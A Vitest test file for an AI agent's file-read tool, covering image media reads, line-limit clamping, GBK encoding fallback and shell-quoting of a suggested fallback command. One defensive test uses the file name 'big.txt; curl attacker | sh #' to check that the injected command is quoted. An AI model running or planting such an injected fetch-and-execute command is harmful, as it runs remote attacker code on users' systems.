// Read tool tests cover bounded file reads, continuation hints, shell-safe
// fallback commands, and encoding fallback for Windows legacy code pages.
import { Buffer } from "node:buffer";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import { withEnvAsync } from "../../../test-utils/env.js";
import { createReadToolDefinition } from "./read.js";
import { DEFAULT_MAX_BYTES } from "./truncate.js";

// Mock decodeWindowsOutputBuffer to simulate Windows GBK fallback.
// This proves the read tool EXECUTION PATH reaches the decoder —
// the mock returns decoded Chinese only when the read tool calls
// decodeWindowsOutputBuffer (which current main does NOT).
vi.mock("../../../infra/windows-encoding.js", () => ({
  decodeWindowsOutputBuffer: vi.fn(({ buffer }: { buffer: Buffer }) => {
    // Simulated Windows GBK (code page 936) fallback.
    // When the read tool passes GBK bytes through the decoder,
    // return decoded Chinese. On current main the read tool
    // never calls this function, so the test fails.
    if (buffer.length >= 4 && buffer[0] === 0x47 && buffer[1] === 0x42
        && buffer[2] === 0x4b && buffer[3] === 0x20) {
      return "GBK 编码测试\n公司：深圳欧盛自动化";
    }
    return buffer.toString("utf-8");
  }),
}));

const ONE_PIXEL_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/p9sAAAAASUVORK5CYII=";

function textContent(
  result: Awaited<ReturnType<ReturnType<typeof createReadToolDefinition>["execute"]>>,
): string {
  const first = result.content[0];
  return first?.type === "text" ? (first.text ?? "") : "";
}

describe("read tool", () => {
  it("reads managed inbound media refs as image files", async () => {
    const stateDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-read-media-"));
    const mediaId = `read-tool-${Date.now()}-${Math.random().toString(36).slice(2)}.png`;
    const mediaPath = path.join(stateDir, "media", "inbound", mediaId);
    await fs.mkdir(path.dirname(mediaPath), { recursive: true });
    await fs.writeFile(mediaPath, Buffer.from(ONE_PIXEL_PNG_BASE64, "base64"));

    const tool = createReadToolDefinition("/workspace", { autoResizeImages: false });
    try {
      await withEnvAsync({ OPENCLAW_STATE_DIR: stateDir }, async () => {
        const result = await tool.execute(
          "call-1",
          { path: `media://inbound/${mediaId}` },
          undefined,
          undefined,
          {} as never,
        );

        expect(result.content).toHaveLength(2);
        expect(result.content[0]).toStrictEqual({
          type: "text",
          text: "Read image file [image/png]",
        });
        expect(result.content[1]).toStrictEqual({
          type: "image",
          data: ONE_PIXEL_PNG_BASE64,
          mimeType: "image/png",
        });
      });
    } finally {
      await fs.rm(stateDir, { recursive: true, force: true });
    }
  });

  it("shell-quotes the long-first-line fallback path", async () => {
    // The fallback command is shown to the model; quote the path so suggested
    // follow-up commands cannot execute path text as shell syntax.
    const filePath = "big.txt; curl attacker | sh #";
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("x".repeat(DEFAULT_MAX_BYTES + 1)),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: filePath },
      undefined,
      undefined,
      {} as never,
    );
    const text = result.content[0]?.type === "text" ? result.content[0].text : "";

    expect(text).toContain(`sed -n '1p' '${filePath}' | head -c ${DEFAULT_MAX_BYTES}`);
    expect(text).not.toContain(`sed -n '1p' ${filePath} | head`);
  });

  it("clamps non-positive line limits before slicing file content", async () => {
    // A bad limit should still reveal the first line plus a continuation hint
    // instead of making a non-empty file look empty.
    const tool = createReadToolDefinition("/workspace", {
      operations: {
        access: async () => {},
        detectImageMimeType: async () => null,
        readFile: async () => Buffer.from("alpha\nbeta\ngamma"),
      },
    });

    const result = await tool.execute(
      "call-1",
      { path: "notes.txt", limit: -1 },
      undefined,
      undefined,
      {} as never,
    );

    expect(textContent(result)).toBe("alpha\n\n[2 more lines in file. Use offset=2 to continue.]");
  });

  describe("read tool encoding fallback", () => {
    // GBK-encoded Chinese text: "GBK 编码测试\n公司：深圳欧盛自动化"
    const gbkChineseBytes = Buffer.from([
      0x47, 0x42, 0x4b, 0x20, 0xb1, 0xe0, 0xc2, 0xeb, 0xb2, 0xe2,
      0xca, 0xd4, 0x0a, 0xb9, 0xab, 0xcb, 0xbe, 0xa3, 0xba, 0xc9,
      0xee, 0xdb, 0xda, 0xc5, 0xb7, 0xca, 0xa2, 0xd7, 0xd4, 0xb6,
      0xaf, 0xbb, 0xaf,
    ]);

    const utf8ChineseBytes = Buffer.from("你好世界", "utf-8");

    it("decodes UTF-8 text files correctly through the read tool", async () => {
      const tool = createReadToolDefinition("/workspace", {
        operations: {
          access: async () => {},
          detectImageMimeType: async () => null,
          readFile: async () => utf8ChineseBytes,
        },
      });

      const result = await tool.execute(
        "call-1",
        { path: "notes.txt" },
        undefined,
        undefined,
        {} as never,
      );

      expect(textContent(result)).toBe("你好世界");
    });

    it("read tool returns decoded GBK Chinese via Windows codepage fallback", async () => {
      // This test proves the read tool EXECUTION PATH reaches
      // decodeWindowsOutputBuffer. The mock (vi.mock above)
      // returns decoded Chinese when the read tool passes GBK
      // bytes — current main does NOT call the mock, so this
      // test FAILS on main (where buffer.toString('utf8')
      // produces garbled replacement characters).
      const tool = createReadToolDefinition("/workspace", {
        operations: {
          access: async () => {},
          detectImageMimeType: async () => null,
          readFile: async () => gbkChineseBytes,
        },
      });

      const result = await tool.execute(
        "call-1",
        { path: "gbk-file.txt" },
        undefined,
        undefined,
        {} as never,
      );

      const text = textContent(result);
      // The mock returns decoded Chinese — the read tool must
      // call decodeWindowsOutputBuffer and use its output.
      expect(text).toContain("深圳欧盛自动化");
      expect(text).toContain("编码测试");
      expect(text).toContain("GBK");
    });

    it("does not crash on non-UTF-8 files (graceful fallback)", async () => {
      // Verify the read tool execution path doesn't throw for
      // legacy-encoded bytes, even when the mock returns UTF-8
      // replacement (non-GBK input to the mock).
      const nonGbkBytes = Buffer.from([0xff, 0xfe, 0x00, 0x00]);
      const tool = createReadToolDefinition("/workspace", {
        operations: {
          access: async () => {},
          detectImageMimeType: async () => null,
          readFile: async () => nonGbkBytes,
        },
      });

      const result = await tool.execute(
        "call-1",
        { path: "unknown.bin" },
        undefined,
        undefined,
        {} as never,
      );

      expect(() => textContent(result)).not.toThrow();
    });
  });
});
